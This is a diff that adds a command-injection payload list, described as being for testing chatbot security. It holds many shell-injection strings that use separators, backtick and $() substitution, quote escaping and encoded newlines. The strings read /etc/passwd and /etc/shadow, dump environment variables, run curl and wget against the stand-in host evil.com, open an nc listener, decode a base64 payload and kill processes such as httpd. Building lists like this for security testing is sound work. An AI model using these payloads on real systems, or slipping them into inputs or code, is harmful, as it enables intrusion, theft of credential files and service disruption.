@@ -1,0 +1,155 @@
+# Command Injection Payloads
+# Command injection payloads for testing chatbot security
+
+# Basic command separators
+; ls -la
+&& ls -la
+| ls -la
+; whoami
+&& whoami
+| whoami
+; id
+&& id
+| id
+; pwd
+&& pwd
+| pwd
+
+# File system exploration
+; cat /etc/passwd
+&& cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+&& cat /etc/shadow
+| cat /etc/shadow
+; ls /
+&& ls /
+| ls /
+
+# System information
+; uname -a
+&& uname -a
+| uname -a
+; ps aux
+&& ps aux
+| ps aux
+; netstat -an
+&& netstat -an
+| netstat -an
+; env
+&& env
+| env
+
+# Command substitution
+`ls -la`
+`whoami`
+`id`
+`pwd`
+`uname -a`
+$(ls -la)
+$(whoami)
+$(id)
+$(pwd)
+$(uname -a)
+
+# Test markers
+; echo 'COMMAND_INJECTION_TEST'
+&& echo 'COMMAND_INJECTION_TEST'
+| echo 'COMMAND_INJECTION_TEST'
+`echo 'COMMAND_INJECTION_TEST'`
+$(echo 'COMMAND_INJECTION_TEST')
+
+# Time-based detection
+; sleep 5
+&& sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+
+# Network commands
+; curl http://evil.com
+&& curl http://evil.com
+| curl http://evil.com
+; wget http://evil.com
+&& wget http://evil.com
+| wget http://evil.com
+; nc -l 4444
+&& nc -l 4444
+| nc -l 4444
+
+# Quote escaping
+'; ls -la; echo '
+'; whoami; echo '
+'; id; echo '
+"; ls -la; echo "
+"; whoami; echo "
+"; id; echo "
+
+# Mixed with normal input
+test; ls -la
+test && whoami
+test | id
+test`whoami`test
+test$(id)test
+hello; cat /etc/passwd
+world && uname -a
+
+# Windows-specific commands
+; dir
+&& dir
+| dir
+; type C:\Windows\System32\drivers\etc\hosts
+&& type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\System32\drivers\etc\hosts
+; net user
+&& net user
+| net user
+
+# PowerShell commands
+; powershell -c "Get-Process"
+&& powershell -c "Get-Process"
+| powershell -c "Get-Process"
+; powershell -c "Get-ChildItem C:\"
+&& powershell -c "Get-ChildItem C:\"
+
+# Encoded commands
+; echo $(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)
+&& echo $(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)
+| echo $(echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d)
+
+# Multiple commands
+; ls -la; whoami; id
+&& ls -la && whoami && id
+| ls -la | head -5
+
+# Background execution
+; nohup sleep 10 &
+&& nohup sleep 10 &
+| nohup sleep 10 &
+
+# File operations
+; touch /tmp/test
+&& touch /tmp/test
+| touch /tmp/test
+; rm /tmp/test
+&& rm /tmp/test
+| rm /tmp/test
+
+# Process manipulation
+; kill -9 $$
+&& kill -9 $$
+| kill -9 $$
+; killall httpd
+&& killall httpd
+| killall httpd
+
+# Alternative separators
+%0a ls -la
+%0d ls -la
+%0a%0d ls -la
+\n ls -la
+\r ls -la
+\r\n ls -la
